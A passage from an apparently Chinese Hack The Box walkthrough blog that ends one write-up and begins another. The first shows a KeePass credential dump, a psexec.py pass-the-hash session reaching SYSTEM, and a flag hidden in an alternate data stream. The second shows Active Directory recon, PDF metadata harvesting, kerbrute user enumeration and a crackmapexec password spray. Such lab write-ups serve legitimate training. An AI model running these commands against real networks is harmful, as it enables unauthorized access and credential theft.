class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">kpcli:/&gt; <span class="hljs-title">show</span> -<span class="hljs-title">f</span> 0</span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Path</span>: /<span class="hljs-title">CEH</span>/</span><br><span class="hljs-function"><span class="hljs-title">Title</span>: <span class="hljs-title">Backup</span> <span class="hljs-title">stuff</span></span><br><span class="hljs-function"><span class="hljs-title">Uname</span>: ?</span><br><span class="hljs-function"> <span class="hljs-title">Pass</span>: <span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span></span><br><span class="hljs-function">  <span class="hljs-title">URL</span>: </span><br><span class="hljs-function"><span class="hljs-title">Notes</span>: </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">kpcli</span>:/&gt; <span class="hljs-title">show</span> -<span class="hljs-title">f</span> 1</span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Path</span>: /<span class="hljs-title">CEH</span>/</span><br><span class="hljs-function"><span class="hljs-title">Title</span>: <span class="hljs-title">Bank</span> <span class="hljs-title">of</span> <span class="hljs-title">America</span></span><br><span class="hljs-function"><span class="hljs-title">Uname</span>: <span class="hljs-title">Michael321</span></span><br><span class="hljs-function"> <span class="hljs-title">Pass</span>: 12345</span><br><span class="hljs-function">  <span class="hljs-title">URL</span>: <span class="hljs-title">https</span>://<span class="hljs-title">www.bankofamerica.com</span></span><br><span class="hljs-function"><span class="hljs-title">Notes</span>: </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">kpcli</span>:/&gt; <span class="hljs-title">show</span> -<span class="hljs-title">f</span> 2</span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Path</span>: /<span class="hljs-title">CEH</span>/</span><br><span class="hljs-function"><span class="hljs-title">Title</span>: <span class="hljs-title">DC</span> <span class="hljs-title">Recovery</span> <span class="hljs-title">PW</span></span><br><span class="hljs-function"><span class="hljs-title">Uname</span>: <span class="hljs-title">administrator</span></span><br><span class="hljs-function"> <span class="hljs-title">Pass</span>: <span class="hljs-title">S1TjAtJHKsugh9oC4VZl</span></span><br><span class="hljs-function">  <span class="hljs-title">URL</span>: </span><br><span class="hljs-function"><span class="hljs-title">Notes</span>: </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">kpcli</span>:/&gt; <span class="hljs-title">show</span> -<span class="hljs-title">f</span> 3</span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Path</span>: /<span class="hljs-title">CEH</span>/</span><br><span class="hljs-function"><span class="hljs-title">Title</span>: <span class="hljs-title">EC</span>-<span class="hljs-title">Council</span></span><br><span class="hljs-function"><span class="hljs-title">Uname</span>: <span class="hljs-title">hackerman123</span></span><br><span class="hljs-function"> <span class="hljs-title">Pass</span>: <span class="hljs-title">pwndyouall</span>!</span><br><span class="hljs-function">  <span class="hljs-title">URL</span>: <span class="hljs-title">https</span>://<span class="hljs-title">www.eccouncil.org</span>/<span class="hljs-title">programs</span>/<span class="hljs-title">certified</span>-<span class="hljs-title">ethical</span>-<span class="hljs-title">hacker</span>-<span class="hljs-title">ceh</span></span><br><span class="hljs-function"><span class="hljs-title">Notes</span>: <span class="hljs-title">Personal</span> <span class="hljs-title">login</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">kpcli</span>:/&gt; <span class="hljs-title">show</span> -<span class="hljs-title">f</span> 4</span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Path</span>: /<span class="hljs-title">CEH</span>/</span><br><span class="hljs-function"><span class="hljs-title">Title</span>: <span class="hljs-title">It</span>&#x27;<span class="hljs-title">s</span> <span class="hljs-title">a</span> <span class="hljs-title">secret</span></span><br><span class="hljs-function"><span class="hljs-title">Uname</span>: <span class="hljs-title">admin</span></span><br><span class="hljs-function"> <span class="hljs-title">Pass</span>: <span class="hljs-title">F7WhTrSFDKB6sxHU1cUn</span></span><br><span class="hljs-function">  <span class="hljs-title">URL</span>: <span class="hljs-title">http</span>://<span class="hljs-title">localhost</span>:8180/<span class="hljs-title">secret.jsp</span></span><br><span class="hljs-function"><span class="hljs-title">Notes</span>: </span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>序列号0看起来像是一条hash:</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">Crazy:~/<span class="hljs-title">HackTheBox</span>$ <span class="hljs-title">psexec.py</span> -<span class="hljs-title">hashes</span> <span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span> <span class="hljs-title">administrator</span>@10.10.10.63 <span class="hljs-title">cmd.exe</span></span><br><span class="hljs-function"><span class="hljs-title">Impacket</span> <span class="hljs-title">v0</span>.10.1.<span class="hljs-title">dev1</span>+20220720.103933.3<span class="hljs-title">c6713e3</span> - <span class="hljs-title">Copyright</span> 2022 <span class="hljs-title">SecureAuth</span> <span class="hljs-title">Corporation</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">[*] <span class="hljs-title">Requesting</span> <span class="hljs-title">shares</span> <span class="hljs-title">on</span> 10.10.10.63.....</span><br><span class="hljs-function">[*] <span class="hljs-title">Found</span> <span class="hljs-title">writable</span> <span class="hljs-title">share</span> <span class="hljs-title">ADMIN</span>$</span><br><span class="hljs-function">[*] <span class="hljs-title">Uploading</span> <span class="hljs-title">file</span> <span class="hljs-title">GXOdPUzo.exe</span></span><br><span class="hljs-function">[*] <span class="hljs-title">Opening</span> <span class="hljs-title">SVCManager</span> <span class="hljs-title">on</span> 10.10.10.63.....</span><br><span class="hljs-function">[*] <span class="hljs-title">Creating</span> <span class="hljs-title">service</span> <span class="hljs-title">WXKS</span> <span class="hljs-title">on</span> 10.10.10.63.....</span><br><span class="hljs-function">[*] <span class="hljs-title">Starting</span> <span class="hljs-title">service</span> <span class="hljs-title">WXKS</span>.....</span><br><span class="hljs-function">[!] <span class="hljs-title">Press</span> <span class="hljs-title">help</span> <span class="hljs-title">for</span> <span class="hljs-title">extra</span> <span class="hljs-title">shell</span> <span class="hljs-title">commands</span></span><br><span class="hljs-function"><span class="hljs-title">Microsoft</span> <span class="hljs-title">Windows</span> [<span class="hljs-title">Version</span> 10.0.10586]</span><br><span class="hljs-function">(<span class="hljs-title">c</span>) 2015 <span class="hljs-title">Microsoft</span> <span class="hljs-title">Corporation</span>. <span class="hljs-title">All</span> <span class="hljs-title">rights</span> <span class="hljs-title">reserved</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt; <span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">nt</span> <span class="hljs-title">authority</span>\<span class="hljs-title">system</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt; </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is BE50-B1C9<br><br> Directory of C:\Users\Administrator\Desktop<br><br>11/08/2017  10:05 AM    &lt;DIR&gt;          .<br>11/08/2017  10:05 AM    &lt;DIR&gt;          ..<br>12/24/2017  03:51 AM                36 hm.txt<br>11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk<br>               2 File(s)            833 bytes<br>               2 Dir(s)   7,478,935,552 bytes free<br><br>C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">type</span> hm.txt<br>The flag is elsewhere.  Look deeper.<br>C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">dir</span> /R<br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is BE50-B1C9<br><br> Directory of C:\Users\Administrator\Desktop<br><br>11/08/2017  10:05 AM    &lt;DIR&gt;          .<br>11/08/2017  10:05 AM    &lt;DIR&gt;          ..<br>12/24/2017  03:51 AM                36 hm.txt<br>                                    34 hm.txt:root.txt:<span class="hljs-variable">$DATA</span><br>11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk<br>               2 File(s)            833 bytes<br>               2 Dir(s)   7,478,935,552 bytes free<br><br>C:\Users\Administrator\Desktop&gt; more &lt; hm.txt:root.txt      <br>afbc.....................................<br><br>C:\Users\Administrator\Desktop&gt; <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Intelligence</title>
    <link href="/post/HackTheBox-Intelligence.html"/>
    <url>/post/HackTheBox-Intelligence.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Wed May 25 12:45:42 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt 10.10.10.248</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.248<br>Host is up (0.21s latency).<br>Not shown: 65516 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>80/tcp    open  http          Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: Intelligence<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-25 11:56:27Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-25T11:58:04+00:00; +6h59m59s from scanner time.<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: 2021-04-19T00:43:16<br>|_Not valid after:  2022-04-19T00:43:16<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: 2021-04-19T00:43:16<br>|_Not valid after:  2022-04-19T00:43:16<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-25T11:58:03+00:00; +7h00m00s from scanner time.<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-25T11:58:05+00:00; +7h00m00s from scanner time.<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: 2021-04-19T00:43:16<br>|_Not valid after:  2022-04-19T00:43:16<br>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: 2021-04-19T00:43:16<br>|_Not valid after:  2022-04-19T00:43:16<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-25T11:58:03+00:00; +7h00m00s from scanner time.<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>49667/tcp open  msrpc         Microsoft Windows RPC<br>49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49692/tcp open  msrpc         Microsoft Windows RPC<br>49702/tcp open  msrpc         Microsoft Windows RPC<br>49714/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-05-25T11:57:23<br>|_  start_date: N/A<br>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Wed May 25 12:58:08 2022 -- 1 IP address (1 host up) scanned in 746.51 seconds</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ whatweb http://intelligence.htb/<br>http://intelligence.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@intelligence.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.248], JQuery, Microsoft-IIS[10.0], Script, Title[Intelligence]<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220525131019783.png" alt="image-20220525131019783"></p><p>整个web页面什么都没有。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dirsearch -u http://intelligence.htb/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/mosaic/.dirsearch/reports/intelligence.htb/-_22-05-25_13-11-13.txt<br><br>Error Log: /home/mosaic/.dirsearch/logs/errors-22-05-25_13-11-13.<span class="hljs-built_in">log</span><br><br>Target: http://intelligence.htb/<br><br>[13:11:14] Starting: <br>[13:11:18] 403 -  312B  - /%2e%2e//google.com<br>[13:11:39] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[13:12:12] 301 -  157B  - /documents  -&gt;  http://intelligence.htb/documents/<br>[13:12:22] 200 -    7KB - /index.html<br></code></pre></td></tr></table></figure><p>似乎该站点的所有资源文件都放在&#x2F;documents中，即使右键查看源码中的css样式与js：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220525131636159.png" alt="image-20220525131636159"  /><p>包括页面中能够让我点击下载的按钮所跳转向的PDF：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220525131832119.png" alt="image-20220525131832119"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220525131904466.png" alt="image-20220525131904466"></p><p>可以将其下载下来，查看他们的元属性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ exiftool 2020-01-01-upload.pdf <br>ExifTool Version Number         : 12.41<br>File Name                       : 2020-01-01-upload.pdf<br>Directory                       : .<br>File Size                       : 26 KiB<br>File Modification Date/Time     : 2021:04:02 01:00:00+08:00<br>File Access Date/Time           : 2022:05:25 13:21:23+08:00<br>File Inode Change Date/Time     : 2022:05:25 13:21:23+08:00<br>File Permissions                : -rw-r--r--<br>File Type                       : PDF<br>File Type Extension             : pdf<br>MIME Type                       : application/pdf<br>PDF Version                     : 1.5<br>Linearized                      : No<br>Page Count                      : 1<br>Creator                         : William.Lee<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ exiftool 2020-12-15-upload.pdf <br>ExifTool Version Number         : 12.41<br>File Name                       : 2020-12-15-upload.pdf<br>Directory                       : .<br>File Size                       : 27 KiB<br>File Modification Date/Time     : 2021:04:02 01:00:00+08:00<br>File Access Date/Time           : 2022:05:25 13:21:41+08:00<br>File Inode Change Date/Time     : 2022:05:25 13:21:41+08:00<br>File Permissions                : -rw-r--r--<br>File Type                       : PDF<br>File Type Extension             : pdf<br>MIME Type                       : application/pdf<br>PDF Version                     : 1.5<br>Linearized                      : No<br>Page Count                      : 1<br>Creator                         : Jose.Williams<br></code></pre></td></tr></table></figure><p>一个是1月1号的，一个是十二月15号的，或许还会有其他PDF：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220525132807357.png" alt="image-20220525132807357"></p><p>看起来是的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta, date<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">daterange</span>(<span class="hljs-params">date1, date2</span>):<br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span> ((date2 - date1).days)+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">yield</span> date1 + timedelta(n)<br><br>start_dt = date(<span class="hljs-number">2020</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>end_dt = date(<span class="hljs-number">2020</span>, <span class="hljs-number">12</span>, <span class="hljs-number">31</span>)<br><span class="hljs-keyword">for</span> dt <span class="hljs-keyword">in</span> daterange(start_dt, end_dt):<br>    <span class="hljs-built_in">print</span>(dt.strftime(<span class="hljs-string">&quot;%Y-%m-%d-upload.pdf&quot;</span>))<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ feroxbuster -w filepdf.txt -u http://intelligence.htb/documents/ -o result.txt<br></code></pre></td></tr></table></figure><p>有很多很多PDF:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> result.txt                                <br>200      GET      126l      413w    11632c http://intelligence.htb/documents/2020-01-20-upload.pdf<br>200      GET      135l      429w    11557c http://intelligence.htb/documents/2020-01-23-upload.pdf<br>200      GET      195l      778w    27522c http://intelligence.htb/documents/2020-01-04-upload.pdf<br>200      GET      131l      410w    11228c http://intelligence.htb/documents/2020-02-17-upload.pdf<br>200      GET      130l      415w    11543c http://intelligence.htb/documents/2020-02-28-upload.pdf<br>200      GET      208l      768w    26835c http://intelligence.htb/documents/2020-01-01-upload.pdf<br>200      GET      192l      711w    26252c http://intelligence.htb/documents/2020-01-25-upload.pdf<br>&lt;skip&gt;..................<br></code></pre></td></tr></table></figure><p>可以用awk处理一下并输出到wget.txt中去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> result.txt | awk <span class="hljs-string">&#x27;&#123; print $6 &#125;&#x27;</span> &gt; wget.txt<br></code></pre></td></tr></table></figure><p>然后通过wget批量下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wget -i wget.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ exiftool 2020-* |grep <span class="hljs-string">&quot;Creator&quot;</span> &gt; user.txt<br>$ <span class="hljs-built_in">cat</span> user.txt                                   <br>Creator                         : William.Lee<br>Creator                         : William.Lee<br>Creator                         : Scott.Scott<br>Creator                         : Jason.Wright<br>Creator                         : Veronica.Patel<br>Creator                         : Jennifer.Thomas<br>Creator                         : Danny.Matthews<br>Creator                         : David.Reed<br>Creator                         : Stephanie.Young<br>Creator                         : Daniel.Shelton<br>&lt;skip&gt;...........................................<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> user.txt| awk <span class="hljs-string">&#x27;&#123; print $3&#125;&#x27;</span> &gt; newuser.txt<br></code></pre></td></tr></table></figure><p>这样我就获取到一个用户名字典，获取PDF中也会保存有密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> *.pdf; <span class="hljs-keyword">do</span> pdftotext -layout <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>; <span class="hljs-keyword">done</span><br>$ grep -rl <span class="hljs-string">&quot;passwd&quot;</span> *.txt<br>$ grep -rl <span class="hljs-string">&quot;password&quot;</span> *.txt<br>2020-06-04-upload.txt<br>$ <span class="hljs-built_in">cat</span> 2020-06-04-upload.txt                <br>New Account Guide<br>Welcome to Intelligence Corp!<br>Please login using your username and the default password of:<br>NewIntelligenceCorpUser9876<br><br>After logging <span class="hljs-keyword">in</span> please change your password as soon as possible.<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> NewIntelligenceCorpUser9876 &gt; passwd.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kerbrute userenum -d intelligence.htb newuser.txt --dc 10.10.10.248 -o exituser.txt<br>$ $ <span class="hljs-built_in">cat</span> exituser.txt|awk -F <span class="hljs-string">&#x27; |@&#x27;</span> <span class="hljs-string">&#x27;&#123;print $8&#125;&#x27;</span> &gt; exitsusers.txt<br>$ <span class="hljs-built_in">cat</span> exitsusers.txt                                    <br><br>William.Lee<br>Scott.Scott<br>Jennifer.Thomas<br>Jason.Wright<br>Veronica.Patel<br>Danny.Matthews<br>William.Lee<br>Daniel.Shelton<br>David.Reed<br>Stephanie.Young<br>John.Coleman<br>&lt;skip&gt;................................<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb 10.10.10.248 -u exitsusers.txt -p passwd.txt --continue-on-success|grep <span class="hljs-string">&#x27;[+]&#x27;</span><br>SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 <br>[+] IP: 10.10.10.248:445Name: intelligence.htb                                  <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>C$                                                NO ACCESSDefault share<br>IPC$                                              READ ONLYRemote IPC<br>IT                                                READ ONLY<br>NETLOGON                                          READ ONLYLogon server share <br>SYSVOL                                            READ ONLYLogon server share <br>Users                                             READ ONLY<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 